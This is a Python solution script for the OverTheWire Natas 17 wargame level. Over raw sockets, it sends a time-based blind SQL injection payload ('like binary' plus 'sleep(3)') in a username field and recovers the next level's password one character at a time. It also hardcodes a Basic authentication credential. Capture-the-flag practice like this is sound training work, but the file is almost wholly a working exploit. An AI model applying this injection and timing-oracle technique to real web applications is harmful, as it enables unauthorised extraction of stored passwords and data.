import socket
import time

HOST: str = "natas17.natas.labs.overthewire.org"
POSSIBLECHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def genReq(password: str) -> str:
    """
    genReq generates a POST request to natas17.natas.labs.overthewire.org with the specified modified username
    input for discovering the password

    :param password: password for modified username input
    :return: created request string
    """
    req = "POST /index.php HTTP/1.1\r\n"
    req += "Host: " + HOST + "\r\n"
    req += "Authorization: Basic bmF0YXMxNzpYa0V1Q2hFMFNibktCdkgxUlU3a3NJYjl1dUxtSTdzZA==\r\n"
    req += "Content-Length: " + str(71 + len(password)) + "\r\n"
    req += "Content-Type: application/x-www-form-urlencoded\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    req += "Accept-Encoding: identity\r\n"
    req += "Accept-Language: en-US,en;q=0.9\r\n"
    req += "Connection: close\r\n\r\n"
    req += 'username=natas18%22+and+password+like+binary+"' + password + '%25"+and+sleep%283%29+%23'
    return req

def findPass(password_guess: str) -> str:
    """
    findPass finds the password of natas16

    :param password_guess: tested password against website
    :return: determined password
    """

    for char in POSSIBLECHARS:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((HOST, 80))
        req: str = genReq(password_guess + char)
        conn.send(req.encode())

        response: str = ""
        start_time = time.time()
        temp_resp = conn.recv(8192).decode("UTF-8", errors = "ignore")
        while temp_resp != "":
            response += temp_resp
            temp_resp = conn.recv(8192).decode("UTF-8", errors = "ignore")

        end_time = time.time()

        if end_time - start_time >= 3:
            print(password_guess + char)
            password_guess = findPass(password_guess + char)
            break

    return password_guess


def main():
    """
    main function is start of code

    :return: Nothing
    """
    print("The final password is: " + findPass(""))

main()
